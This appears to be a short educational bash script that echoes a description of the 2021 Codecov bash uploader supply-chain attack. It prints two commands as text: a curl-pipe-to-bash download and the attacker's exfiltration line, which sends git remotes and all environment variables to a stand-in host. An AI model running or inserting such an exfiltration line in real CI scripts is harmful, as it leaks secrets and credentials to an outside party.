#!/bin/bash
# Simulates the Codecov bash uploader attack
# The real attack modified the bash uploader script hosted on codecov.io
# to exfiltrate CI environment variables

echo "[*] Codecov Bash Uploader — Attack Simulation"
echo "[*] In the real attack, this curl command:"
echo "    curl -s https://codecov.io/bash | bash"
echo "    would download a modified script that also ran:"
echo ""
echo '    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://attacker-c2.com/upload'
echo ""
echo "[!] This sent ALL environment variables (including secrets) to the attacker."
echo "[!] Affected: ~29,000 organizations from Jan 31 - Apr 1, 2021"
